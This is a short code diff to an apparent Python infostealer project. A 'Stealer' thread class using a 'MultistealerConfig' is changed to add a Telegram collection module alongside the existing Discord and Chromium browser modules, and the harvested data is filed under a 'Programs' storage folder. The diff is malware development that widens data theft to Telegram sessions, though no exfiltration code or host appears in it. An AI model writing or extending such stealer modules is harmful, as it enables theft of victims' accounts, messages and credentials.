@@ -9,7 +9,8 @@ from .utils.config import MultistealerConfig
 
 from .modules.system import System
 from .modules.discord import Discord
-from .modules.chromium import Chromium
+from .modules.browser import Chromium
+from .modules.telegram import Telegram
 
 
 class Stealer(Thread):
@@ -96,6 +97,15 @@ class Stealer(Thread):
                     self.config.StorageFolder,
                     "Programs",
                     (self.discord,),
+                    self.errors
+                )
+            },
+            {
+                "object": Telegram(
+                    self.config.StoragePath,
+                    self.config.StorageFolder,
+                    "Programs",
+                    (self.telegram,),
                     self.errors
                 )
             }
